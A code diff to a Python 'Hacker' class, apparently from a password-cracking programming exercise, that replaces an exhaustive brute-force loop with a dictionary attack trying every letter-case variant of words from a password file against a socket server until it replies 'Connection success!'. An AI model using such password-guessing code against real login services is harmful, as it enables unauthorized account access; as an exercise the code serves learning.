@@ -14,22 +14,26 @@ class Hacker(object):
         self.address = (self.ip_address, self.port)
 
     def main(self):
-        keys = list(map(chr, range(97, 123)))
-        keys.extend(list(map(chr, range(48, 58))))
         self.client_socket.connect(self.address)
 
-        i = 1
-        while True:
-            pass_trial = itertools.product(keys, repeat=i)
-            for _ in range(36 ** i):
-                msg = ''.join(next(pass_trial))
-                self.client_socket.send(msg.encode())
-                response = self.client_socket.recv(1024)
-                response = response.decode()
-                if response == 'Connection success!':
-                    print(msg)
-                    return
-            i += 1
+        with open('c:\\Users\\Kolda2\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\passwords.txt',
+                  'r') as passwords:
+            while True:
+                pass_list = []
+                pass_seed = passwords.readline().rstrip('\n')
+                original = pass_seed
+                pass_seed = pass_seed.translate({ord(i): None for i in '0123456789'})
+                trials = list(map(''.join, itertools.product(*zip(pass_seed.upper(), pass_seed.lower()))))
+                for trial in trials:
+                    pass_list.append(original.translate({ord(y): trial[x] for x, y in enumerate(pass_seed)}))
+
+                for trial in pass_list:
+                    self.client_socket.send(trial.encode())
+                    response = self.client_socket.recv(1024)
+                    response = response.decode()
+                    if response == 'Connection success!':
+                        print(trial)
+                        return
 
     def closing(self):
         self.client_socket.close()
